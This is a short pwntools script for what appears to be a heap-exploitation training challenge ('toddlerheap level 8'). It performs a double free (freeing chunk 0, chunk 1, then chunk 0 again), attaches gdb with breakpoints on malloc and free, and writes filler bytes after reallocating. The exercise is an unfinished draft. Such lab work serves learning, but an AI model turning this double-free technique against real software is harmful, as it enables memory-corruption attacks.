from pwn import * 

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
b malloc
b free
'''

p.sendline("malloc 0 24")
p.sendline("malloc 1 24")

p.sendline("free 0")
p.sendline("free 1")
p.sendline("free 0")

gdb.attach(p, s)

p.interactive()

#p.recvuntil("Data: ", drop = True)
#heap_leak = int.from_bytes(p.recvline().strip(), 'little')


p.sendline("malloc 0 24")
p.sendline("malloc 1 24")
p.sendline("malloc 2 24")
p.sendline("read_copy 0")
p.sendline(b"A" * 0x18)

